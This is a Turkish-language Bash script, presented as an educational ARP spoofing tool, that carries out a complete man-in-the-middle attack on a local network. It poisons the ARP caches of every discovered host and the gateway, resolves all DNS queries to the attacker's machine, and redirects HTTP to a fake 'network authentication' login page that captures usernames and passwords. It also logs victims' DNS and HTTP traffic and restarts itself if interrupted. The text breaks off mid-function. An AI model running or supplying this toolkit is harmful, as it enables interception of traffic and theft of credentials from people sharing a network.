#!/bin/bash

# =============================================================================
# GELİŞMİŞ ARP SPOOFING EĞİTİM ARACI
# Eğitim Amaçlı - Yetkisiz Kullanım Yasaktır
# =============================================================================

# Renkli çıktı için ANSI kodları
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# Gerekli araçları kontrol et
for tool in arp-scan arpspoof python3 fuser dnsmasq ip iptables arping; do
    if ! command -v $tool &> /dev/null; then
        echo -e "${RED}HATA: '$tool' komutu bulunamadı.${NC}"
        echo -e "${YELLOW}Arch Linux için: sudo pacman -S dsniff arp-scan python dnsmasq psmisc iputils${NC}"
        exit 1
    fi
done

# Root yetkileri kontrolü
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}HATA: Bu script root yetkileriyle çalıştırılmalıdır.${NC}"
    echo -e "${YELLOW}Kullanım: sudo $0${NC}"
    exit 1
fi

# Global değişkenler
ARPSPOOF_PIDS=()
WEB_SERVER_PID=""
DNS_SERVER_PID=""
INTERFACE=""
GATEWAY_IP=""
GATEWAY_MAC=""
MY_IP=""
MY_MAC=""
TARGET_LIST=""
LOG_FILE="/tmp/mitm_attack_$(date +%Y%m%d_%H%M%S).log"
DNSMASQ_CONF="/tmp/dnsmasq_fake_$$.conf"
DNSMASQ_LOG="/tmp/dnsmasq_queries_$$.log"

# Logo ve başlangıç
print_banner() {
    clear
    echo -e "${CYAN}╔════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${BOLD}          ARP SPOOFING EĞİTİM ARACI v2.0                    ${NC}${CYAN}║${NC}"
    echo -e "${CYAN}║${YELLOW}          Eğitim Amaçlı - Yetkisiz Kullanım Yasaktır         ${NC}${CYAN}║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# Log fonksiyonu - hem ekrana hem dosyaya yaz
log_message() {
    local level=$1
    shift
    local message="$@"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    # Dosyaya yaz
    echo "[$timestamp] [$level] $message" >> "$LOG_FILE"
    
    # Ekrana renkli yazdır
    case $level in
        "INFO")
            echo -e "${BLUE}[ℹ]${NC} $message" | tee -a "$LOG_FILE"
            ;;
        "SUCCESS")
            echo -e "${GREEN}[✓]${NC} $message" | tee -a "$LOG_FILE"
            ;;
        "WARNING")
            echo -e "${YELLOW}[⚠]${NC} $message" | tee -a "$LOG_FILE"
            ;;
        "ERROR")
            echo -e "${RED}[✗]${NC} $message" | tee -a "$LOG_FILE"
            ;;
        "ATTACK")
            echo -e "${MAGENTA}[⚡]${NC} $message" | tee -a "$LOG_FILE"
            ;;
        "CAPTURE")
            echo -e "${RED}${BOLD}[🎯 YAKALANDI]${NC} $message" | tee -a "$LOG_FILE"
            ;;
    esac
}

# Detaylı temizlik fonksiyonu
cleanup() {
    echo ""
    log_message "WARNING" "⚠️  DURDURMA SİNYALİ ALINDI - TEMİZLİK YAPILIYOR..."
    log_message "INFO" "Script manuel olarak durduruldu (CTRL+C)"
    
    # ARP spoofing süreçlerini durdur
    if [ ${#ARPSPOOF_PIDS[@]} -gt 0 ]; then
        log_message "INFO" "🛑 ARP spoofing süreçleri sonlandırılıyor..."
        for pid in "${ARPSPOOF_PIDS[@]}"; do
            kill -15 "$pid" 2>/dev/null
            sleep 0.2
            kill -9 "$pid" 2>/dev/null
        done
    fi
    pkill -9 arpspoof 2>/dev/null
    
    # DNS sunucusunu durdur
    if [ ! -z "$DNS_SERVER_PID" ]; then
        log_message "INFO" "🛑 DNS sunucusu durduruluyor (PID: $DNS_SERVER_PID)..."
        kill -15 "$DNS_SERVER_PID" 2>/dev/null
        sleep 0.5
        kill -9 "$DNS_SERVER_PID" 2>/dev/null
    fi
    pkill -9 -f "dnsmasq.*--no-daemon" 2>/dev/null
    
    # Web sunucusunu durdur
    if [ ! -z "$WEB_SERVER_PID" ]; then
        log_message "INFO" "🛑 Web sunucusu durduruluyor (PID: $WEB_SERVER_PID)..."
        kill -15 "$WEB_SERVER_PID" 2>/dev/null
        sleep 0.5
        kill -9 "$WEB_SERVER_PID" 2>/dev/null
    fi
    fuser -k 8080/tcp 2>/dev/null
    pkill -9 -f "python.*http.server.*8080" 2>/dev/null
    
    # IP yönlendirmeyi kapat
    log_message "INFO" "🔒 IP forwarding devre dışı bırakılıyor..."
    echo 0 > /proc/sys/net/ipv4/ip_forward
    
    # iptables kurallarını temizle
    log_message "INFO" "🧹 iptables kuralları temizleniyor..."
    iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null
    iptables -t nat -D OUTPUT -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null
    iptables -t nat -D PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353 2>/dev/null
    iptables -t nat -F 2>/dev/null
    
    # ARP cache'i temizle
    log_message "INFO" "🗑️  ARP cache temizleniyor..."
    ip -s -s neigh flush all &>/dev/null
    
    # Hedeflere gerçek ARP bilgilerini geri gönder
    if [ ! -z "$TARGET_LIST" ] && [ ! -z "$GATEWAY_IP" ] && [ ! -z "$GATEWAY_MAC" ] && [ ! -z "$INTERFACE" ]; then
        log_message "INFO" "♻️  Hedef cihazlara gerçek ARP tabloları restore ediliyor..."
        for TARGET_IP in $TARGET_LIST; do
            # Gateway'in gerçek MAC adresini hedeflere gönder
            arping -c 5 -I "$INTERFACE" -S "$GATEWAY_IP" -s "$GATEWAY_MAC" "$TARGET_IP" &>/dev/null &
            # Kendi gerçek MAC adresimizi gateway'e gönder
            arping -c 5 -I "$INTERFACE" "$MY_IP" &>/dev/null &
        done
        sleep 3
        log_message "SUCCESS" "✅ ARP tabloları restore edildi"
    fi
    
    # Geçici dosyaları temizle
    rm -f "$DNSMASQ_CONF" 2>/dev/null
    
    echo ""
    log_message "SUCCESS" "✅ TEMİZLİK TAMAMLANDI!"
    log_message "INFO" "📄 Tüm loglar kaydedildi: $LOG_FILE"
    echo ""
    echo -e "${CYAN}╔════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${BOLD}               SALDIRI DURDURULDU                            ${NC}${CYAN}║${NC}"
    echo -e "${CYAN}╠════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}║${NC} Log dosyası: ${GREEN}$LOG_FILE${NC}"
    echo -e "${CYAN}║${NC} Tüm ağ ayarları normale döndürüldü."
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    # ÇIKIŞ YAPMA! Trap nedeniyle zaten çıkacak
}

# Trap sinyalleri - SADECE CTRL+C ile durdur
trap cleanup SIGINT SIGTERM

# EXIT trap'ini KALDIRDIK - artık otomatik kapanmayacak!

# Ağ bilgilerini topla
gather_network_info() {
    log_message "INFO" "Ağ bilgileri toplanıyor..."
    
    INTERFACE=$(ip -o -4 route show to default | awk '{print $5}' | head -n1)
    GATEWAY_IP=$(ip -o -4 route show to default | awk '{print $3}' | head -n1)
    MY_IP=$(ip -o -4 addr show dev "$INTERFACE" | awk '{print $4}' | cut -d'/' -f1 | head -n1)
    MY_MAC=$(ip link show "$INTERFACE" | awk '/link\/ether/ {print $2}')
    
    if [ -z "$INTERFACE" ] || [ -z "$GATEWAY_IP" ] || [ -z "$MY_IP" ]; then
        log_message "ERROR" "Ağ bilgileri alınamadı!"
        exit 1
    fi
    
    # Gateway MAC adresini al
    log_message "INFO" "Gateway MAC adresi öğreniliyor..."
    ping -c 2 "$GATEWAY_IP" &>/dev/null
    sleep 1
    GATEWAY_MAC=$(ip neigh show "$GATEWAY_IP" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | head -n1)
    
    if [ -z "$GATEWAY_MAC" ]; then
        # ARP ile tekrar dene
        arping -c 3 -I "$INTERFACE" "$GATEWAY_IP" &>/dev/null
        sleep 1
        GATEWAY_MAC=$(ip neigh show "$GATEWAY_IP" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | head -n1)
    fi
    
    if [ -z "$GATEWAY_MAC" ]; then
        log_message "ERROR" "Gateway MAC adresi öğrenilemedi!"
        exit 1
    fi
    
    echo ""
    echo -e "${CYAN}╔════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${BOLD}                    AĞ BİLGİLERİ                             ${NC}${CYAN}║${NC}"
    echo -e "${CYAN}╠════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}║${NC} Arayüz      : ${GREEN}$INTERFACE${NC}"
    echo -e "${CYAN}║${NC} Saldırgan IP : ${GREEN}$MY_IP${NC}"
    echo -e "${CYAN}║${NC} Saldırgan MAC: ${GREEN}$MY_MAC${NC}"
    echo -e "${CYAN}║${NC} Gateway IP   : ${YELLOW}$GATEWAY_IP${NC}"
    echo -e "${CYAN}║${NC} Gateway MAC  : ${YELLOW}$GATEWAY_MAC${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    log_message "SUCCESS" "Ağ bilgileri toplandı"
}

# Hedefleri tara
scan_targets() {
    log_message "INFO" "Ağdaki cihazlar taranıyor (bu birkaç saniye sürebilir)..."
    
    # Önce ARP cache'i temizle
    ip -s -s neigh flush all &>/dev/null
    
    # Ağı tara
    TARGET_LIST=$(arp-scan --localnet -I "$INTERFACE" 2>/dev/null | \
                  awk '/^[0-9]/ {print $1}' | \
                  grep -v -E "^${GATEWAY_IP}$|^${MY_IP}$" | \
                  sort -u)
    
    if [ -z "$TARGET_LIST" ]; then
        log_message "ERROR" "Ağda başka cihaz bulunamadı!"
        exit 1
    fi
    
    TARGET_COUNT=$(echo "$TARGET_LIST" | wc -l)
    
    echo ""
    echo -e "${CYAN}╔════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${BOLD}                  BULUNAN HEDEFLER                          ${NC}${CYAN}║${NC}"
    echo -e "${CYAN}╠════════════════════════════════════════════════════════════════╣${NC}"
    
    local counter=1
    for target in $TARGET_LIST; do
        local target_mac=$(arp-scan "$target" -I "$INTERFACE" 2>/dev/null | awk '/^[0-9]/ {print $2}' | head -n1)
        [ -z "$target_mac" ] && target_mac="Bilinmiyor"
        echo -e "${CYAN}║${NC} ${counter}. ${GREEN}${target}${NC} - MAC: ${BLUE}${target_mac}${NC}"
        ((counter++))
    done
    
    echo -e "${CYAN}╠════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}║${NC} ${BOLD}Toplam: ${TARGET_COUNT} hedef${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    log_message "SUCCESS" "$TARGET_COUNT hedef bulundu"
}

# DNS sunucusunu yapılandır ve başlat
setup_dns_server() {
    log_message "INFO" "DNS Spoofing yapılandırılıyor..."
    
    # Dnsmasq config oluştur
    cat > "$DNSMASQ_CONF" << EOF
# DNS Spoofing Yapılandırması
port=5353
listen-address=$MY_IP
bind-interfaces
no-resolv
no-hosts
log-queries
log-facility=$DNSMASQ_LOG

# TÜM domain'leri saldırgan IP'ye çözümle
address=/#/$MY_IP

# Özel ayarlar
cache-size=0
no-negcache
EOF

    # Port 5353'ün boş olduğundan emin ol
    fuser -k 5353/udp 2>/dev/null
    sleep 1
    
    # Dnsmasq başlat
    dnsmasq --conf-file="$DNSMASQ_CONF" --no-daemon &
    DNS_SERVER_PID=$!
    sleep 2
    
    if ! ps -p $DNS_SERVER_PID > /dev/null 2>&1; then
        log_message "ERROR" "DNS sunucusu başlatılamadı!"
        return 1
    fi
    
    log_message "SUCCESS" "DNS sunucusu başlatıldı (PID: $DNS_SERVER_PID, Port: 5353)"
    
    # DNS trafiğini yönlendir (port 53 -> 5353)
    iptables -t nat -A PREROUTING -i "$INTERFACE" -p udp --dport 53 -j REDIRECT --to-port 5353
    
    log_message "SUCCESS" "DNS yönlendirmesi aktif (Port 53 → 5353)"
    log_message "INFO" "DNS sorguları log: $DNSMASQ_LOG"
    
    return 0
}

# Web sunucusunu başlat
setup_web_server() {
    log_message "INFO" "Sahte web sunucusu hazırlanıyor..."
    
    # index.html oluştur (yoksa)
    if [ ! -f "index.html" ]; then
        cat > index.html << 'HTMLEOF'
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ağ Kimlik Doğrulama</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            max-width: 400px;
            width: 100%;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo svg {
            width: 60px;
            height: 60px;
            fill: #667eea;
        }
        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 10px;
        }
        .subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #e1e1e1;
            border-radius: 5px;
            font-size: 14px;
            transition: border-color 0.3s;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #667eea;
        }
        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
        }
        button:active {
            transform: translateY(0);
        }
        .error {
            background: #fee;
            border: 1px solid #fcc;
            color: #c33;
            padding: 12px;
            border-radius: 5px;
            margin-bottom: 20px;
            display: none;
            text-align: center;
        }
        .error.show {
            display: block;
            animation: shake 0.5s;
        }
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-10px); }
            75% { transform: translateX(10px); }
        }
        .loading {
            display: none;
            text-align: center;
            margin-top: 20px;
        }
        .loading.show {
            display: block;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
            </svg>
        </div>
        <h2>Ağ Kimlik Doğrulama</h2>
        <p class="subtitle">Devam etmek için lütfen kimlik bilgilerinizi girin</p>
        
        <div class="error" id="error">
            ⚠️ Bağlantı hatası! Lütfen bilgilerinizi kontrol edin.
        </div>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Kullanıcı Adı / E-posta</label>
                <input type="text" id="username" name="username" required autocomplete="username">
            </div>
            <div class="form-group">
                <label for="password">Şifre</label>
                <input type="password" id="password" name="password" required autocomplete="current-password">
            </div>
            <button type="submit">Giriş Yap</button>
        </form>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p style="margin-top: 10px; color: #666;">Doğrulanıyor...</p>
        </div>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const error = document.getElementById('error');
        const loading = document.getElementById('loading');
        
        // URL'de error parametresi varsa hatayı göster
        if (window.location.search.includes('error=1')) {
            error.classList.add('show');
            setTimeout(() => {
                error.classList.remove('show');
            }, 3000);
        }
        
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Kimlik bilgilerini konsola yazdır (gerçek saldırıda sunucuya gönderilir)
            console.log('🔓 Yakalanan Kimlik Bilgileri:');
            console.log('Kullanıcı:', username);
            console.log('Şifre:', password);
            console.log('Zaman:', new Date().toLocaleString());
            console.log('---');
            
            // Loading animasyonu göster
            form.style.display = 'none';
            loading.classList.add('show');
            
            // 2 saniye sonra hata göster ve formu tekrar göster
            setTimeout(() => {
                loading.classList.remove('show');
                form.style.display = 'block';
                window.location.href = window.location.pathname + '?error=1';
            }, 2000);
        });
    </script>
</body>
</html>
HTMLEOF
        log_message "SUCCESS" "index.html oluşturuldu"
    fi
    
    # Port 8080'i temizle
    fuser -k 8080/tcp 2>/dev/null
    sleep 1
    
    # Python web sunucusu başlat
    python3 -m http.server 8080 --bind 0.0.0.0 &>/dev/null &
    WEB_SERVER_PID=$!
    sleep 2
    
    if ! ps -p $WEB_SERVER_PID > /dev/null 2>&1; then
        log_message "ERROR" "Web sunucusu başlatılamadı!"
        exit 1
    fi
    
    log_message "SUCCESS" "Web sunucusu başlatıldı (PID: $WEB_SERVER_PID, Port: 8080)"
}

# iptables yönlendirme kuralları
setup_iptables() {
    log_message "INFO" "iptables yönlendirme kuralları ayarlanıyor..."
    
    # Mevcut kuralları temizle
    iptables -t nat -F 2>/dev/null
    
    # SADECE HTTP (80) trafiğini 8080'e yönlendir
    # NOT: HTTPS (443) şifreli olduğu için yönlendirilemez!
    iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080
    
    # Yerel test için OUTPUT zinciri (opsiyonel)
    iptables -t nat -A OUTPUT -p tcp --dport 80 -m owner --uid-owner $(id -u) -j REDIRECT --to-port 8080
    
    log_message "SUCCESS" "HTTP yönlendirmesi aktif (Port 80 → 8080)"
    log_message "WARNING" "HTTPS (443) şifreli olduğu için yönlendirilemez!"
}

# ARP Spoofing saldırısını başlat
start_arp_spoofing() {
    log_message "ATTACK" "ARP Spoofing saldırısı başlatılıyor..."
    echo ""
    echo -e "${RED}╔════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║${BOLD}                    SALDIRI DETAYLARI                        ${NC}${RED}║${NC}"
    echo -e "${RED}╚════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    local counter=1
    for TARGET_IP in $TARGET_LIST; do
        local target_mac=$(ip neigh show "$TARGET_IP" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | head -n1)
        [ -z "$target_mac" ] && target_mac="Öğreniliyor..."
        
        echo -e "${MAGENTA}═══ Hedef #${counter}: ${TARGET_IP} ═══${NC}"
        echo -e "  ${CYAN}→${NC} Hedef MAC   : ${BLUE}${target_mac}${NC}"
        echo -e "  ${CYAN}→${NC} Gateway'e söylenen: \"${GREEN}${TARGET_IP}${NC}'nin MAC'i = ${GREEN}${MY_MAC}${NC} (Saldırgan)\""
        echo -e "  ${CYAN}→${NC} Hedefe söylenen  : \"${YELLOW}${GATEWAY_IP}${NC}'nin MAC'i = ${GREEN}${MY_MAC}${NC} (Saldırgan)\""
        
        # Hedef → Gateway arası spoofing
        arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$GATEWAY_IP" &>/dev/null &
        local pid1=$!
        ARPSPOOF_PIDS+=($pid1)
        echo -e "  ${GREEN}✓${NC} ARP Spoof #1 başlatıldı (PID: ${pid1})"
        
        # Gateway → Hedef arası spoofing
        arpspoof -i "$INTERFACE" -t "$GATEWAY_IP" -r "$TARGET_IP" &>/dev/null &
        local pid2=$!
        ARPSPOOF_PIDS+=($pid2)
        echo -e "  ${GREEN}✓${NC} ARP Spoof #2 başlatıldı (PID: ${pid2})"
        echo ""
        
        ((counter++))
        
        # Sistem yükünü azaltmak için her 5 hedeften sonra bekle
        if [ $((counter % 5)) -eq 0 ]; then
            sleep 1
        fi
    done
    
    sleep 3
    
    # Doğrulama
    local running_count=$(ps aux | grep -c "[a]rpspoof")
    if [ $running_count -eq 0 ]; then
        log_message "ERROR" "ARP Spoofing süreçleri başlatılamadı!"
        exit 1
    fi
    
    log_message "SUCCESS" "ARP Spoofing aktif ($running_count süreç çalışıyor)"
}

# Ana saldırı durumu
show_attack_status() {
    echo ""
    echo -e "${GREEN}╔════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║${BOLD}                  SALDIRI AKTİF! ⚡                          ${NC}${GREEN}║${NC}"
    echo -e "${GREEN}╠════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║${NC} ${BOLD}Ağ Arayüzü:${NC}    $INTERFACE"
    echo -e "${GREEN}║${NC} ${BOLD}Hedef Sayısı:${NC}   $TARGET_COUNT cihaz"
    echo -e "${GREEN}║${NC} ${BOLD}ARP Süreçleri:${NC}  $(ps aux | grep -c "[a]rpspoof") adet"
    echo -e "${GREEN}║${NC} ${BOLD}HTTP Redirect:${NC}  ✓ Aktif (Port 80 → 8080)"
    echo -e "${GREEN}║${NC} ${BOLD}DNS Spoofing:${NC}   ✓ Aktif (Port 53 → 5353)"
    echo -e "${GREEN}║${NC} ${BOLD}Web Sunucu:${NC}     ✓ Çalışıyor (Port 8080)"
    echo -e "${GREEN}╠════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║${NC} ${RED}ÖNEMLİ:${NC} HTTPS siteleri şifreli olduğu için yönlendirilemez!"
    echo -e "${GREEN}║${NC} ${RED}        Sadece HTTP (şifresiz) siteler çalışır.${NC}"
    echo -e "${GREEN}╠════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║${NC} ${YELLOW}Test İçin (HTTP Siteleri):${NC}"
    echo -e "${GREEN}║${NC}   • http://neverssl.com ${CYAN}(Gerçek HTTP sitesi)${NC}"
    echo -e "${GREEN}║${NC}   • http://example.com ${CYAN}(Gerçek HTTP sitesi)${NC}"
    echo -e "${GREEN}║${NC}   • http://rastgelesitejkhdsjkfh.com ${CYAN}(Olmayan site - DNS çözümlenecek!)${NC}"
    echo -e "${GREEN}║${NC}   ${RED}✗ https://google.com çalışmaz (HTTPS)${NC}"
    echo -e "${GREEN}║${NC}   ${RED}✗ https://facebook.com çalışmaz (HTTPS)${NC}"
    echo -e "${GREEN}╠════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║${NC} ${CYAN}Trafik İzleme:${NC}"
    echo -e "${GREEN}║${NC}   sudo tcpdump -i $INTERFACE -n 'port 80 or port 53' -A"
    echo -e "${GREEN}╠════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║${NC} ${RED}Durdurmak için: CTRL+C${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    log_message "INFO" "Tüm sistemler hazır ve çalışıyor"
    log_message "INFO" "Log dosyası: $LOG_FILE"
}

# DNS sorgu monitörü - Terminale detaylı yazdır
monitor_dns_queries() {
    if [ -f "$DNSMASQ_LOG" ]; then
        # Son 10 satırı oku
        tail -n 10 "$DNSMASQ_LOG" 2>/dev/null | grep "query" | while read line; do
            domain=$(echo "$line" | grep -oP 'query\[\w+\] \K[^ ]+' | head -1)
            query_type=$(echo "$line" | grep -oP 'query\[\K\w+' | head -1)
            timestamp=$(echo "$line" | awk '{print $1, $2}')
            
            if [ ! -z "$domain" ]; then
                echo -e "  ${CYAN}[DNS SORGU]${NC} ${timestamp} - ${YELLOW}${domain}${NC} (${query_type}) → ${GREEN}${MY_IP}${NC}"
                log_message "CAPTURE" "DNS: $domain ($query_type) → $MY_IP"
            fi
        done
    fi
}

# HTTP trafiğini yakalama ve gösterme
monitor_http_traffic() {
    # tcpdump ile HTTP trafiğini yakala (arka planda, kısa süre)
    timeout 5 tcpdump -i "$INTERFACE" -n -l 'tcp port 80' -A 2>/dev/null | \
    while read line; do
        # Host header'ı yakala
        if echo "$line" | grep -q "Host:"; then
            host=$(echo "$line" | grep -oP 'Host: \K[^\r\n]+')
            echo -e "  ${MAGENTA}[HTTP İSTEK]${NC} Hedef: ${YELLOW}${host}${NC} → Yönlendiriliyor"
            log_message "CAPTURE" "HTTP: $host → $MY_IP:8080"
        fi
        
        # GET/POST isteklerini yakala
        if echo "$line" | grep -qE "GET|POST"; then
            method=$(echo "$line" | grep -oP '(GET|POST)')
            path=$(echo "$line" | grep -oP '(GET|POST) \K[^ ]+')
            if [ ! -z "$path" ]; then
                echo -e "  ${MAGENTA}[HTTP ${method}]${NC} ${path}"
            fi
        fi
    done &
}

# Ana monitoring döngüsü - ASLA KAPANMAYACAK
monitoring_loop() {
    local counter=0
    local last_arp_count=$(ps aux | grep -c "[a]rpspoof")
    
    echo -e "\n${BOLD}${CYAN}[*] Canlı İzleme Başladı - Script sürekli çalışacak!${NC}"
    echo -e "${BOLD}${RED}[*] Durdurmak için CTRL+C yapın!${NC}\n"
    
    log_message "INFO" "Monitoring döngüsü başladı - sürekli çalışma modunda"
    
    while true; do
        sleep 5
        counter=$((counter + 5))
        
        # Her 10 saniyede bir DNS ve HTTP trafiğini kontrol et
        if [ $((counter % 10)) -eq 0 ]; then
            echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
            echo -e "${BOLD}[$(date '+%H:%M:%S')] TRAFİK İZLEME${NC}"
            echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
            
            # DNS sorgularını göster
            monitor_dns_queries
            
            # HTTP trafiğini göster
            monitor_http_traffic
        fi
        
        # Her 15 saniyede bir sistem durum kontrolü
        if [ $((counter % 15)) -eq 0 ]; then
            local current_arp=$(ps aux | grep -c "[a]rpspoof")
            local web_status="❌"
            local dns_status="❌"
            
            # Web sunucu kontrolü
            if ps -p $WEB_SERVER_PID > /dev/null 2>&1; then
                web_status="✅"
            else
                log_message "WARNING" "Web sunucusu durdu, yeniden başlatılıyor..."
                fuser -k 8080/tcp 2>/dev/null
                sleep 1
                python3 -m http.server 8080 --bind 0.0.0.0 &>/dev/null &
                WEB_SERVER_PID=$!
                web_status="🔄 YENİDEN BAŞLATILDI"
            fi
            
            # DNS sunucu kontrolü
            if [ ! -z "$DNS_SERVER_PID" ] && ps -p $DNS_SERVER_PID > /dev/null 2>&1; then
                dns_status="✅"
            else
                log_message "WARNING" "DNS sunucusu durdu, yeniden başlatılıyor..."
                setup_dns_server
                dns_status="🔄 YENİDEN BAŞLATILDI"
            fi
            
            # ARP süreç kontrolü ve otomatik düzeltme
            if [ $current_arp -lt $last_arp_count ]; then
                log_message "WARNING" "⚠️  ARP süreç sayısı azaldı! ($last_arp_count → $current_arp)"
                
                if [ $current_arp -eq 0 ]; then
                    log_message "ERROR" "❌ TÜM ARP süreçleri durdu! YENİDEN BAŞLATILIYOR..."
                    start_arp_spoofing
                fi
            fi
            
            last_arp_count=$current_arp
            
            # Durum raporu
            echo -e "\n${BLUE}╔══════════════════════════════════════════════════════════╗${NC}"
            echo -e "${BLUE}║ ${BOLD}SİSTEM DURUMU - [$(date '+%H:%M:%S')]${NC}"
            echo -e "${BLUE}╠══════════════════════════════════════════════════════════╣${NC}"
            echo -e "${BLUE}║${NC} ARP Süreçleri : ${GREEN}${current_arp}${NC} aktif"
            echo -e "${BLUE}║${NC} DNS Sunucu    : ${dns_status}"
            echo -e "${BLUE}║${NC} Web Sunucu    : ${web_status}"
            echo -e "${BLUE}║${NC} Çalışma Süresi: $((counter / 60)) dakika $((counter % 60)) saniye"
            echo -e "${BLUE}╚══════════════════════════════════════════════════════════╝${NC}\n"
        fi
        
        # Her 30 saniyede bir ARP tablosu örnekleri
        if [ $((counter % 30)) -eq 0 ]; then
            echo -e "${CYAN}╔════════════════════════════════════════════════════════════════╗${NC}"
            echo -e "${CYAN}║ ${BOLD}ARP TABLO ÖRNEKLERİ (İlk 3 Hedef)${NC}"
            echo -e "${CYAN}╚════════════════════════════════════════════════════════════════╝${NC}"
            local count=0
            for TARGET_IP in $TARGET_LIST; do
                if [ $count -ge 3 ]; then break; fi
                local arp_entry=$(ip neigh show "$TARGET_IP" 2>/dev/null)
                if [ ! -z "$arp_entry" ]; then
                    echo -e "  ${GREEN}${TARGET_IP}:${NC} $arp_entry"
                    log_message "INFO" "ARP: $TARGET_IP -> $arp_entry"
                fi
                ((count++))
            done
            echo ""
        fi
        
        # Her 60 saniyede bir detaylı istatistik
        if [ $((counter % 60)) -eq 0 ]; then
            echo ""
            echo -e "${MAGENTA}╔════════════════════════════════════════════════════════════════╗${NC}"
            echo -e "${MAGENTA}║           SALDIRI İSTATİSTİKLERİ                            ║${NC}"
            echo -e "${MAGENTA}╠════════════════════════════════════════════════════════════════╣${NC}"
            echo -e "${MAGENTA}║${NC} Toplam Süre        : ${GREEN}$((counter / 60)) dakika${NC}"
            echo -e "${MAGENTA}║${NC} Aktif Hedef        : ${GREEN}$TARGET_COUNT cihaz${NC}"
            echo -e "${MAGENTA}║${NC} ARP Süreçleri      : ${GREEN}$(ps aux | grep -c "[a]rpspoof") adet${NC}"
            echo -e "${MAGENTA}║${NC} Log Dosyası        : ${CYAN}$LOG_FILE${NC}"
